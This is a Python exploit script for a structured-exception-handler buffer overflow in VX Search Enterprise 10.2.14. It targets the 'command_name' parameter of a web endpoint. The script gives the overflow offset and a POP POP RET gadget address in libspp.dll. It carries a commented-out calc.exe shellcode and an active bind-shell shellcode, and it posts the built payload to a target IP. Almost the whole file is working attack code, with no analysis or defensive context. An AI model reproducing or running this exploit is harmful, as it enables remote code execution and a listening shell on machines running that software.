#!/usr/bin/env python

import sys
import requests

# VX Search Enterprise 10.2.14 'command_name' buffer overflow SEH#
#
# 524 bytes to SEH overwrite
# 4 bytes for handler, 4 bytes for ptr
#
# POP POP RET
# !mona seh
#
# Log data, item 10
# Address=10027452
# Message=  0x10027452 : pop edi # pop esi # ret 0x04 | ascii {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files (x86)\VX Search Enterprise\bin\libspp.dll)

u = 'http://192.168.86.143:8008/add_command?sid=602d62c8cf69a584621ba1f3cb3530b4' # Note, SID needs to be valid

nops = '\x90'*16

'''
# CALC.exe 319 bytes
buf =  ""
buf += "\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05"
buf += "\xef\xff\xff\xff\x48\xbb\x31\xa2\x9c\xd4\x1b\xc3\x3f"
buf += "\x0f\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
buf += "\xcd\xea\x1f\x30\xeb\x2b\xff\x0f\x31\xa2\xdd\x85\x5a"
buf += "\x93\x6d\x5e\x67\xea\xad\x06\x7e\x8b\xb4\x5d\x51\xea"
buf += "\x17\x86\x03\x8b\xb4\x5d\x11\xea\x17\xa6\x4b\x8b\x30"
buf += "\xb8\x7b\xe8\xd1\xe5\xd2\x8b\x0e\xcf\x9d\x9e\xfd\xa8"
buf += "\x19\xef\x1f\x4e\xf0\x6b\x91\x95\x1a\x02\xdd\xe2\x63"
buf += "\xe3\xcd\x9c\x90\x91\x1f\x84\x73\x9e\xd4\xd5\xcb\x48"
buf += "\xbf\x87\x31\xa2\x9c\x9c\x9e\x03\x4b\x68\x79\xa3\x4c"
buf += "\x84\x90\x8b\x27\x4b\xba\xe2\xbc\x9d\x1a\x13\xdc\x59"
buf += "\x79\x5d\x55\x95\x90\xf7\xb7\x47\x30\x74\xd1\xe5\xd2"
buf += "\x8b\x0e\xcf\x9d\xe3\x5d\x1d\x16\x82\x3e\xce\x09\x42"
buf += "\xe9\x25\x57\xc0\x73\x2b\x39\xe7\xa5\x05\x6e\x1b\x67"
buf += "\x4b\xba\xe2\xb8\x9d\x1a\x13\x59\x4e\xba\xae\xd4\x90"
buf += "\x90\x83\x23\x46\x30\x72\xdd\x5f\x1f\x4b\x77\x0e\xe1"
buf += "\xe3\xc4\x95\x43\x9d\x66\x55\x70\xfa\xdd\x8d\x5a\x99"
buf += "\x77\x8c\xdd\x82\xdd\x86\xe4\x23\x67\x4e\x68\xf8\xd4"
buf += "\x5f\x09\x2a\x68\xf0\xce\x5d\xc1\x9c\xa1\xc2\x3f\x0f"
buf += "\x31\xa2\x9c\xd4\x1b\x8b\xb2\x82\x30\xa3\x9c\xd4\x5a"
buf += "\x79\x0e\x84\x5e\x25\x63\x01\xa0\x33\x8a\xad\x67\xe3"
buf += "\x26\x72\x8e\x7e\xa2\xf0\xe4\xea\x1f\x10\x33\xff\x39"
buf += "\x73\x3b\x22\x67\x34\x6e\xc6\x84\x48\x22\xd0\xf3\xbe"
buf += "\x1b\x9a\x7e\x86\xeb\x5d\x49\xb7\x7a\xaf\x5c\x21\x54"
buf += "\xda\xf9\xd4\x1b\xc3\x3f\x0f"
'''

# 355 bind
buf =  ""
buf += "\xdb\xd4\xd9\x74\x24\xf4\x5a\x31\xc9\xb1\x53\xbe\xb1"
buf += "\xd0\x25\x9b\x83\xc2\x04\x31\x72\x13\x03\xc3\xc3\xc7"
buf += "\x6e\xdf\x0c\x85\x91\x1f\xcd\xea\x18\xfa\xfc\x2a\x7e"
buf += "\x8f\xaf\x9a\xf4\xdd\x43\x50\x58\xf5\xd0\x14\x75\xfa"
buf += "\x51\x92\xa3\x35\x61\x8f\x90\x54\xe1\xd2\xc4\xb6\xd8"
buf += "\x1c\x19\xb7\x1d\x40\xd0\xe5\xf6\x0e\x47\x19\x72\x5a"
buf += "\x54\x92\xc8\x4a\xdc\x47\x98\x6d\xcd\xd6\x92\x37\xcd"
buf += "\xd9\x77\x4c\x44\xc1\x94\x69\x1e\x7a\x6e\x05\xa1\xaa"
buf += "\xbe\xe6\x0e\x93\x0e\x15\x4e\xd4\xa9\xc6\x25\x2c\xca"
buf += "\x7b\x3e\xeb\xb0\xa7\xcb\xef\x13\x23\x6b\xcb\xa2\xe0"
buf += "\xea\x98\xa9\x4d\x78\xc6\xad\x50\xad\x7d\xc9\xd9\x50"
buf += "\x51\x5b\x99\x76\x75\x07\x79\x16\x2c\xed\x2c\x27\x2e"
buf += "\x4e\x90\x8d\x25\x63\xc5\xbf\x64\xec\x2a\xf2\x96\xec"
buf += "\x24\x85\xe5\xde\xeb\x3d\x61\x53\x63\x98\x76\x94\x5e"
buf += "\x5c\xe8\x6b\x61\x9d\x21\xa8\x35\xcd\x59\x19\x36\x86"
buf += "\x99\xa6\xe3\x33\x91\x01\x5c\x26\x5c\xf1\x0c\xe6\xce"
buf += "\x9a\x46\xe9\x31\xba\x68\x23\x5a\x53\x95\xcc\x75\xf8"
buf += "\x10\x2a\x1f\x10\x75\xe4\xb7\xd2\xa2\x3d\x20\x2c\x81"
buf += "\x15\xc6\x65\xc3\xa2\xe9\x75\xc1\x84\x7d\xfe\x06\x11"
buf += "\x9c\x01\x03\x31\xc9\x96\xd9\xd0\xb8\x07\xdd\xf8\x2a"
buf += "\xab\x4c\x67\xaa\xa2\x6c\x30\xfd\xe3\x43\x49\x6b\x1e"
buf += "\xfd\xe3\x89\xe3\x9b\xcc\x09\x38\x58\xd2\x90\xcd\xe4"
buf += "\xf0\x82\x0b\xe4\xbc\xf6\xc3\xb3\x6a\xa0\xa5\x6d\xdd"
buf += "\x1a\x7c\xc1\xb7\xca\xf9\x29\x08\x8c\x05\x64\xfe\x70"
buf += "\xb7\xd1\x47\x8f\x78\xb6\x4f\xe8\x64\x26\xaf\x23\x2d"
buf += "\x56\xfa\x69\x04\xff\xa3\xf8\x14\x62\x54\xd7\x5b\x9b"
buf += "\xd7\xdd\x23\x58\xc7\x94\x26\x24\x4f\x45\x5b\x35\x3a"
buf += "\x69\xc8\x36\x6f"

buf += '\x90'*153 # 508, corrected for calc

seh = '\xEB\x0f\x90\x90' # JMP 15
seh2 = '\x52\x74\x02\x10'  # POP, POP, RET;

d = nops + buf + seh + seh2

try:
	r = requests.post(u, data = { 'command_name' : d})
except:
	print "[-] Something borked"
	sys.exit(1)
